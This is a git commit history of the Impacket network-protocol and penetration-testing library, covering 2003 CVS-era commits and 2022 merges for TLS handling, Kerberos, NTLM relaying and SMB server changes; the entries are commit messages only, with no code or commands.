commit 26fdc3e16117b1b8d3ab2c3578d35dc49d81cf08
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:50:38 2003 +0000

    s/from impact/from impacket/

commit 324fb1078105cf2c2353ae4e9d3a42e61a6a507e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:50:29 2003 +0000

    s/from impact/from impacket/.
    Protected socket.settimeout calls within a try/except block.

commit aab39d6c42dd8881248af555ddf44c7732316152
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 19:30:24 2003 +0000

    Initial revision.

commit 7065ab5979b28c5d1631bae361193f187bcf1637
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 18:45:51 2003 +0000

    Added missing imports.

commit 84b82fae4e2c736680630ef0fe9841d7bf29a3f6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:46:46 2003 +0000

    Removed remaining HTML markup.

commit f9882d7bc39547c63ee12714ebe93bfbf72818a1
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:46:03 2003 +0000

    Initial revision.

commit cc494bc3d23ab5ce2f86ffe32f27ef3c534ad334
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:37:16 2003 +0000

    Bumped version number to 0.9.1.

commit 3402b5675834ee3498be3dd2b8006b5d68923d84
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:36:57 2003 +0000

    Changed source license to Apache.

commit 1dba4c20e0d47ec614521e251d072116f75f3ef8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 17:33:42 2003 +0000

    Added Pysmb license.

commit dd89f918ddb0123fcd5262dbc3b1a1c6138cd90e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:21:30 2003 +0000

    Added LICENSE.

commit 28aab9a98188adfde10c6642de2c4ea6afee660e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:21:14 2003 +0000

    Added README and LICENSE to the binary distribution.

commit 1e1b77896b50062974fb29c68aa3c06b8c3dcdff
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 20:20:38 2003 +0000

    Initial revision.

commit c359ea340099a315d6886f06530268282eccfa17
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 17:52:06 2003 +0000

    Global rename from conspired to impacket.

commit a9aef3b4d58c5b41baa50b4fd35b68ba08f28677
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 23 19:26:16 2003 +0000

    Updated to reflect very minor changes in the Pcapy API.

commit 330218aa4ce9557a28f35cb4e96d630e4129cc12
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 23 19:25:49 2003 +0000

    Updated contact info.

commit 4ac639ef9ad58abad029f445a3261a8382a298d6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 20 22:04:52 2003 +0000

    Added documentation.
    Fixed catch of the mysterious PcapError exception.

commit b9bc816237a9de20a64c0119f1ee5c86ad4ab213
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 20 15:49:43 2003 +0000

    Split pcap capture files into smaller ones, one for each TCP connection found in the original.

commit 2d9bee978cb19f79739597b08d4d593700a9e3a8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:50:36 2003 +0000

    Include examples and this very file into source distributions.

commit 60b31ed69f794478c4d8ce3b4d63ef0d7d28d3f8
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:47:05 2003 +0000

    s/disectors/dissectors/

commit 6d01f6287c209bc1e406b0a03c4ff49520cfed9e
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 9 17:40:37 2003 +0000

    Initial revision
======================: FILES :======================
======================: BRANCHES :======================
======================: LOGINFO :======================
commit 3c6713e309cae871d685fa443d3e21b7026a2155
Merge: d923c00f bcee97a1
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Jul 20 10:39:33 2022 -0300

    Merge pull request #1364 from SecureAuthCorp/SSL-methods
    
    Changed the setting up for new SSL connections

commit bcee97a18d73f4dbe54d9e436434bf2ef6c70e9d
Merge: c74caff0 d923c00f
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Jul 20 10:14:49 2022 -0300

    Merge branch 'master' into SSL-methods

commit c74caff0f2dd91a5be78140358dd30b653f7be6a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jul 20 10:08:37 2022 -0300

    Added support for TLS1.0

commit d923c00f75d54b972bca573a211a82f09b55261a
Merge: 0e50fe5f 145e8490
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jul 19 11:54:10 2022 -0300

    Merge pull request #1369 from p0dalirius/smb-server-auth-hook
    
    [smbserver.py] Added a callback function to incoming authentications

commit 0e50fe5f33acfc47ffabb88ed4bb5138c69f3cbf
Merge: d2a59ca4 cde3d458
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 18:04:21 2022 -0300

    Merge pull request #1359 from arossert/charset_normalizer
    
    Use charset_normalizer

commit d2a59ca4e32a38c4808282f861e4234cc2fa0ac8
Merge: 424c0bc5 9421672e
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 17:56:06 2022 -0300

    Merge pull request #1363 from SecureAuthCorp/dc-host-option
    
    Added dc-host option to some example scripts

commit 424c0bc54bc4f3ef1239adac6aa29802ab35366b
Merge: 8b1a99f7 5729662b
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 18 17:23:53 2022 -0300

    Merge pull request #1281 from tirkarthi/fix-collections
    
    Import ABC from collections.abc for Python 3.10 compatibility.

commit 145e8490034d4a79cd5e22d33987ce6616e8520a
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Jul 17 10:43:53 2022 +0200

    Improved authentication hooking

commit 51b046019d7588426ea116ea90cbe42b658232cc
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Jul 17 08:58:56 2022 +0200

    Added possibility of hooking authentication credentials using AuthCallback hook

commit 8b1a99f7c715702eafe3f24851817bb64721b156
Merge: a9bf2cd4 acd17c6c
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 8 21:37:59 2022 -0300

    Merge pull request #1327 from nopernik/master
    
    MS-TSTS Interface Implementation

commit a9bf2cd481bf458715cff63553cbb849de03afce
Merge: f2eb2b65 9c7857a2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 8 16:55:59 2022 -0300

    Merge pull request #1362 from SecureAuthCorp/ldap-ntlm-negotiate-error
    
    Added error handling in LDAP during NTLM Authentication

commit f2eb2b65ad443f86841a9ac20c92418eaa8aefd4
Merge: ac35841f 16d06b24
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 4 18:53:48 2022 -0300

    Merge pull request #1365 from ly4k/new-krb5-error-codes
    
    Add new Kerberos error codes

commit 16d06b2487a80742c6c0492af80cb068300c5260
Author: Oliver Lyak ly4k <53348818+ly4k@users.noreply.github.com>
Date:   Fri Jul 1 01:50:36 2022 +0200

    added new kerberos error codes

commit e10ae8e6549f0d5fbc537582e34b65ed1be45aa0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 29 17:22:20 2022 -0300

    Updated rdp_check.py
    * Since the pyOpenSSL requirement has been updated, we can now use the dump_publickey() function.

commit 01cae775df2d2ac7f6be4ed27b3885aaed9f3350
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 29 17:18:10 2022 -0300

    Changed the setting up for new SSL connections
    * Modified the SSL context setting. Using TLS_METHOD the protocol version used will be negotiated to the highest version mutually supported by the client and the server
    * Modified cipher list setting. Defining 'ALL:@SECLEVEL=0' enables compatibility with previous versions.
    * Updated pyOpenSSL requirement to >=v21.0.0. This version included the TLS_METHOD definition.

commit 9421672ee635f2746aae5624e67ff47c9be05eba
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jun 28 23:16:00 2022 -0300

    Improved error handling
    * Added SMB session error handling in getMachineName() (SMB blocked).
    * Added LDAP session error handling in NTLM authentication (NTLM disabled).

commit 5122bcf6b188416d5fb9d0725e099866ab895c9c
Merge: 58fcbf27 f53a8062
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Tue Jun 28 22:46:34 2022 +0200

    Merge pull request #2 from lap1nou/master
    
    Fixed ldap 'SSL routines error'

commit f53a80627507da345a1c6e7a9bc4ab8fd83dd9e3
Author: lap1nou <lapinousexy@gmail.com>
Date:   Tue Jun 28 22:45:46 2022 +0200

    Fixed TLS method

commit 9c7857a25e3adfa12aa2ef097335e5991ca2dacb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Jun 28 17:34:48 2022 -0300

    Added error handling in LDAP during NTLM Authentication
    
    If NTLM is disabled, the LDAP bind request using NTLM will fail during the NTLM negotiation.

commit a8c45a7a110dc4325075a8c755e7dbb2e8eacea5
Author: lap1nou <lapinousexy@gmail.com>
Date:   Tue Jun 28 20:57:32 2022 +0200

    Fixed ldap 'SSL routines error'

commit cde3d4584e3d5642b1fceaff676f2cd6e88d92f2
Author: Amir Rossert <amir.rossert@safebreach.com>
Date:   Sun Jun 26 15:26:29 2022 +0300

    Use charset_normalizer

commit 181827dda0fbb8af134388afb1bc1e159e2e24e5
Merge: ac35841f cfe14a87
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jun 24 15:47:40 2022 -0300

    Merge branch 'add-dc-host-option' into dc-host-option
    
    # Conflicts:
    #       examples/GetADUsers.py
    #       examples/GetNPUsers.py
    #       examples/GetUserSPNs.py
    #       examples/findDelegation.py
    #       examples/raiseChild.py

commit 58fcbf27e07b53c3881715419fca72ba7594c5c9
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 22:51:29 2022 +0200

    Update tds.py

commit 223ad861b86ab9cf3fc9d07ded10a6ca897b9b11
Merge: ac35841f 55bcbbcf
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 10:46:59 2022 +0200

    Merge pull request #1 from mpgn/patch-1
    
    Fix mssql 'SSL routines' error #856

commit 55bcbbcf806fe477a6b7273069fb2a1c54ebfa00
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Jun 23 10:46:06 2022 +0200

    Fix mssql 'SSL routines' error #856
    
    #856
    
    By default, TLS1.0 is not supported anymore when you install a new mssql server (2016/2019)

commit ac35841f0288aabdfa9fb51f6bb6d83ce2618d2d
Merge: 37a44fa9 3e8b252b
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 6 12:38:12 2022 -0300

    Merge pull request #1322 from ShutdownRepo/rbcd
    
    [rbcd.py] Updating arguments description

commit 37a44fa961dbddbe81c29e09a16c3e602476a155
Merge: a98b7b97 fa5f661e
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 6 11:45:26 2022 -0300

    Merge pull request #1334 from kiwids0220/master
    
    fixing GetUserSPN.py enctype aes128

commit fa5f661e293bb9dd49a1a211afb00f11afc2548c
Author: kiwids <60630639+kiwids0220@users.noreply.github.com>
Date:   Sun Jun 5 19:29:29 2022 -0500

    fixing GetUserSPN.py enctype aes128
    
    Missed a parenthesis so that the output result will not be fully shown

commit acd17c6c2a585944e6b84d391d86d1114410e909
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Sat Jun 4 21:24:41 2022 +0300

    Changed helper classess & functions structure

commit 1796ae83157bd25e136f4e9c6cd9da7ceb8dffbe
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri Jun 3 17:50:50 2022 +0300

    do_tasklist rewrite

commit c3e0a54f35aa109c51fac0432a624d63c127cda6
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri Jun 3 17:13:49 2022 +0300

    move UUID to the constant section

commit a98b7b97416650cd2a23e480a69be61b65ec2f0a
Author: Colinatorr <69719906+Colinatorr@users.noreply.github.com>
Date:   Mon May 30 20:01:27 2022 +0200

    fix: typo (#1314)

commit e60db5ef6f842ae10de4730f4f04c51faefd5877
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Fri May 27 09:21:12 2022 +0300

    Minor fix

commit a46a7953c6def42c8c53af439ee49be0fcb82a7b
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Mon May 23 19:05:07 2022 +0300

    Code Cleanup

commit 8d926abaf2a23be182f7b80a33a8794f8c7b0501
Author: Alexander Korznikov <nopernik@gmail.com>
Date:   Mon May 23 18:18:00 2022 +0300

    MS-TSTS Interface Implementation

commit 3e8b252b03036c4c054836cc81d86c47c032d57a
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sat May 14 12:43:57 2022 +0200

    Updating arguments description

commit fb1e50c1a90ef19c765efd261fe0722cf766ec95
Merge: d5097759 98238ee2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 13 14:02:33 2022 -0300

    Merge pull request #1320 from ThePirateWhoSmellsOfSunflowers/fix_setuppy
    
    Add dependency in setup.py

commit 98238ee2324bc31be3ebd7ceb7bc9f6c4777e1b3
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Fri May 13 17:58:38 2022 +0200

    add dsinternals

commit d509775976ba37f4eaea630cc511e2fc3b65aba3
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed May 4 12:00:02 2022 -0300

    And going back to dev version

commit 7a18ef5c8b06aac5e36334927789429777382928
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed May 4 11:33:16 2022 -0300

    About to tag a release

commit 678981d28e1cf6b81dd047d3680263ed9d5fa5e3
Merge: 6afc2698 bffca7ec
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue May 3 17:41:39 2022 -0300

    Merge remote-tracking branch 'upstream/master' into master-Impacket

commit 6afc26983791c1e1d97210e8416f2570396cd57c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue May 3 17:41:24 2022 -0300

    NTLMrelayx: Fixing some issues
    - Fixed multi-relay capability when NTLM negotiation or authentication fails
    - Fixed some typos when logging info

commit bffca7ec5baa536d47c099243e7f965bf0630e69
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 3 13:29:08 2022 -0700

    Tests: Fixing more tests on Windows Server 2016 onwards
    
    EVEN, PAR, TSCH and some RPCRT unit tests moved to using PKT_PRIVACY.

commit 46c5439a63478b4ffb72c3fe063d1d88319cab84
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 3 10:58:34 2022 -0700

    Tests: Fixing SAMR tests for Windows Server 2016 onwards
    
    Windows Server 2016 and up requires PKT_PRIVACY on remote SAM RPC calls.

commit 0e40593a4e642c17f687cd755a77402704290a2e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Sun May 1 21:03:24 2022 -0300

    Updated ChangeLog

commit e2a70e22340eef5dc9a38683ce4326de240579ec
Merge: b37fd99d 02c0dbcc
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Sun May 1 20:20:57 2022 -0300

    Merge pull request #1308 from jlvcm/patch-1
    
    Fix typo that made sp_start_job unusable

commit 02c0dbcc77d4a59a16f7fa1824a11e15cee96884
Author: João Melo <joaolvcm@gmail.com>
Date:   Sun May 1 19:34:50 2022 +0100

    fix typo that made sp_start_job unusable
    
    commands are found by prepending the `do_` prefix to the function name, and `sp_start_job` function name is missing the `do_` prefix so it is impossible to call it.

commit b37fd99de4dd657aa4a264af4056e80d8e62eb78
Merge: 95a48050 e85de4e2
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 29 19:21:48 2022 -0300

    Merge pull request #1305 from ThePirateWhoSmellsOfSunflowers/start_tls
    
    Implementing StartTLS

commit 95a48050a4696583f1583cfeac5cc633a041d68e
Merge: 76ec43e7 419ff083
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Apr 28 17:47:22 2022 -0300

    Merge pull request #1303 from SecureAuthCorp/smbserver-smb2_file_both_directory_info
    
    SMBServer: Missed info level for SMB2 FileBothDirectoryInfo

commit e85de4e277359412353f5b8ae0596a452efc4e42
Merge: 76ec43e7 abc6e618
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Thu Apr 28 12:56:28 2022 +0200

    Merge private branch StartTLS into master

commit 76ec43e7c8b2b1cb58060338298ef690de8871c7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 27 11:44:16 2022 -0700

    Removing travis config file
    
    Now that we completely moved to GitHub Actions, removing the Travis-CI configuration file.

commit f342871b4f98f6e47b64bfe8c0b089986d654779
Merge: c7d352b7 a6cfd909
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Apr 25 21:16:29 2022 -0300

    Merge pull request #1293 from SecureAuthCorp/warning-escape
    
    Removed deprecation warnings due to regex strings

commit a6cfd9099e4a8bb5b114d918162b4f7344050a0b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 25 09:11:30 2022 -0700

    Fixed regex binary type
    
    Do not mix a string regex with the binary being matched.

commit 419ff0836508162359b73db4026813dda584ef61
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 25 08:56:39 2022 -0700

    SMBServer: Missed info level for SMB2 FileBothDirectoryInfo
    
    The response item was created but not fields were filled in. This should fix #1205.

commit abc6e618a981bb0e31e056135962b16a1a42121c
Author: ThePirateWhoSmellsOfSunflowers <ThePirateWhoSmellsOfSunflowers@users.noreply.github.com>
Date:   Sat Apr 23 15:51:22 2022 +0200

    implementing StartTLS upgrade : first try

commit c7d352b746872c5e28c7a78f7a2d083535e5cbc6
Merge: 701e3a90 6f457bfc
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 22 16:19:48 2022 -0300

    Merge pull request #1210 from SecureAuthCorp/kerb-key-list-attack
    
    Added Kerberos Key List Attack

commit 701e3a907bcddc5dbd5c8d222d9a2ed57dfc0d7d
Merge: 17ae0913 dfaef151
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Apr 22 16:13:39 2022 -0300

    Merge pull request #1300 from 0xdeaddood/remove-py2tests
    
    Removed Python 2.7 tests

commit dfaef151fe18c934c388f2ba2db3684e1c01cb16
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 21 00:04:59 2022 -0300

    Removed Python 2.7 tests

commit 17ae09137fd2e52b7d28cc4538c19fb2a9c89cd6
Merge: 06e5e869 67342473
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 23:46:04 2022 -0300

    Merge pull request #1171 from snovvcrash/smbpasswd-altcreds
    
    Connect to RPC using alternative credentials

commit 06e5e8691416f432692dd962feaa749fef2581f0
Merge: 116ec395 1276e068
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 22:05:18 2022 -0300

    Merge pull request #1294 from RedTeamPentesting/fix_server_challenge_length
    
    Fix default NTLM server challenge in smbserver.py

commit 116ec3955c6af6d915ddb171114a71730a75b5ee
Merge: cab711af 9a38cbcb
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 13:37:36 2022 -0300

    Merge pull request #1296 from mpgn/master
    
    Update mimikatz.py to not trigger the AV on windows

commit cab711af3b6faf59e09488c7f2d756e416eee27e
Merge: 0ca97c1f 67f1cb26
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed Apr 20 11:47:42 2022 -0300

    Merge pull request #1284 from mohemiv/master
    
    Fixing a bug in exchanger.py when a GAL doesn't exist

commit 0ca97c1f696d412b2acbd47670b0ea45138d5f7a
Merge: 68fd6b79 f4bf5e96
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Apr 18 15:43:27 2022 -0300

    Merge pull request #1297 from SecureAuthCorp/ntlmrelayx-refactor
    
    Ntlmrelayx refactor

commit 9a38cbcbc00a31e2ca0397db871b1baae4e8f44d
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Thu Apr 14 11:16:33 2022 +0200

    Update mimikatz.py

commit 6f457bfc207486d0e364ad27b9154095697bd722
Merge: 24106e60 68fd6b79
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Apr 11 17:10:40 2022 -0300

    Merge branch 'master-Impacket' into kerb-key-list-attack
    
    # Conflicts:
    #       examples/secretsdump.py

commit 24106e60b017a1f0c9bcc7139fc3077281febf99
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Apr 11 17:04:24 2022 -0300

    Added error handling and parameter validation, and removed unused code

commit 1276e068a3398da465f157b5441deb58d1ad8010
Author: Jonas Lieb <jonas.lieb@redteam-pentesting.de>
Date:   Fri Apr 8 16:56:45 2022 +0200

    Fix default NTLM server challenge in smbserver.py

commit 68fd6b799f179eed5b3cccfd7cb60850626b0b24
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 7 16:56:53 2022 -0300

    Added some checks related to RRP when use-vss option is enabled in secretsdump.py

commit 54a3afa9a932ca359a6ecfc7ac54ddb3d938b108
Merge: 25a73ded e868dba5
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 7 12:30:50 2022 -0300

    Merge branch 'dpapi-test' into master-Impacket

commit 25a73ded234d7b32c0e89b7545c963963a31f664
Merge: eb283663 4039f5c4
Author: leandro <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Apr 7 12:15:05 2022 -0300

    Merge pull request #1203 from w0rmh013/fix_dpapi_entropy
    
    Fixed entropy parameter handling in dpapi.py/unprotect

commit f4bf5e9645d4a9ca5b00586dfeb05bf71d6596a8
Merge: dffa436c e155103e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 19:18:57 2022 -0300

    Merge branch 'capnkrunchy/master' into ntlmrelayx-refactor

commit dffa436c36549baaf8a37e6f22973f087b38eead
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 18:37:45 2022 -0300

    Fixed LDAP attack addComputer when no computer name password is defined

commit 8002ff52caee39d0cee7b26e928b303229005ba7
Merge: d372d36f 4e64bb0a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Apr 6 18:30:00 2022 -0300

    Merge branch 'ldapattack-modified' into ntlmrelayx-refactor

commit e868dba5bcb95b626268770dd9f6f8997d9907d9
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 6 13:52:38 2022 -0700

    DPAPI: Added some simple tests to blob decryption with and without entropy

commit 7e8ee9e0bb999fd647eb02e10afd41db83e6bab0
Merge: 6d3c6b93 eb283663
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 1 08:34:13 2022 -0700

    Merge branch 'master' into warning-escape

commit eb2836630029321f04ae341dd3d1333512a3dce3
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 22:49:42 2022 -0300

    Fixed get_padded_options in ImpactPacket.py
    It fixes #1285

commit d372d36fa70fcb7987c023d4a67e3f0883acf0b5
Merge: 9c578a24 6ff2a692
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 15:29:34 2022 -0300

    Merge branch 'shadowcredentials' into ntlmrelayx-refactor
    
    # Conflicts:
    #       examples/ntlmrelayx.py
    #       impacket/examples/ntlmrelayx/utils/config.py

commit 6ff2a692ee219a00ecd0686bcda63ec0d7db3b7c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 15:26:21 2022 -0300

    Removed example domain name

commit 9c578a2480d00928c927f44196d4a0813da465c0
Merge: 690a125e 2ab3136c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 31 12:02:37 2022 -0300

    Merge branch 'ADCS-ESC1/6' into ntlmrelayx-refactor
    
    # Conflicts:
    #       examples/ntlmrelayx.py
    #       impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py
    #       impacket/examples/ntlmrelayx/utils/config.py

commit 690a125ec293525bf4b370e1451a7cc8dbcb3648
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 21:27:37 2022 -0300

    Fixed unclosing parentheses

commit ceff76cb742c44c6ef51a52a5571e0cafffb20cd
Merge: c18103d2 b50f37c5
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 21:24:18 2022 -0300

    HTTP multi-relay
    Added multi-relay capabilities to the HTTP Relay Server

commit c18103d23b012208fb7be5822b2cfb4dee9c8933
Merge: c2379624 b47715b8
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:32:12 2022 -0300

    Merge branch 'dumpadcs-once' into ntlmrelayx-refactor

commit c237962425efa0f7de270d607c5053b530c71fb0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:15:29 2022 -0300

    HTTP multi-relay
    Added multi-relay capabilities to the HTTP Relay Server

commit a168273cb88ce9f2b6b00e0324352e683c8d78ac
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 30 20:14:01 2022 -0300

    NTLMrelayx: Added a no-multirelay option
    There are some scenarios where the multi-relay approach doesn't work. In those cases, it's very helpful to have an option that disables this capability.
    - Added a no-multirelay flag in ntlmrelayx.py. Modified the smbrelayserver.py flow. This extends PR#1273.
    - Modified the target processing in targetsutils.py

commit ff32269707df18ef672d6e1036ba647331e91c13
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Mar 23 18:04:07 2022 -0300

    Added a very simple workflow to automatically label new PRs (#1286)

commit b47715b8422d1fe735ad0d994003b57090b9fd55
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Wed Mar 23 13:42:00 2022 +0100

    Escape ADCS template names in LDAP query

commit 67f1cb26b5b870f23ff40ad42a6bcd68843c385b
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 03:38:26 2022 +0300

    Fixing a bug when the GAL doesn't exist (3)

commit 5297ec64d123100121bd41a1d2cc74b7677bac59
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 03:23:41 2022 +0300

    Fixing a bug when the GAL doesn't exist (2)

commit efee5fa62a625c0b2ccf646b4038aa029dc81f8c
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 01:48:57 2022 +0300

    Fixing a bug in -lookup-type default value

commit 081d951d715e89928ed8ed4224b5b2e177b48253
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Wed Mar 23 01:16:50 2022 +0300

    Fixing a bug when the GAL doesn't exist

commit 5729662b06c04b7b1324ec0c7e96fc21f53e216d
Author: Karthikeyan Singaravelan <tir.karthi@gmail.com>
Date:   Mon Mar 21 13:23:31 2022 +0000

    Import ABC from collections.abc for Python 3.10 compatibility.

commit b50f37c54ad1a760baf88630f927ccaa5980db78
Merge: 71a7c406 1271d369
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 15 16:22:59 2022 +0100

    merge mainline

commit 71a7c40610a19b3213e55d3dded3599d317163bf
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 15 16:18:55 2022 +0100

    more stable

commit 5986098edff509038189e996c37587c8dec33bd3
Merge: 8c6e2e1b 1271d369
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Mon Mar 14 23:48:26 2022 +0100

    Merge branch 'SecureAuthCorp:master' into dumpadcs-once

commit 461607e3ed92b9fca561f8ebfb67cf3adfb27900
Merge: 1271d369 34e16731
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Mar 11 17:17:42 2022 -0300

    Merge branch 'zblurx/master' into ntlmrelayx-refactor

commit 1271d369e8e31b0e87a7542e454e81300dc3a5d5
Merge: 6042675a 6e288da4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Mar 11 12:15:50 2022 -0300

    Merge pull request #1276 from SecureAuthCorp/ccache-refactor
    
    CCache refactor

commit 6e288da406e6e14aacb4658856de37d6ccc69e54
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:51:47 2022 -0300

    CCache: Fixed unit tests on 2.7 so no errrors are thrown
    Co-authored-by: Martin Gallo <mgallo@secureauth.com>

commit 8251464dd8a928eb02096a93058b206c954bb8e1
Merge: 2e9b8e3b 1c9624c0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:40:51 2022 -0300

    Merge branch 'ccache-tests' into ccache-refactor

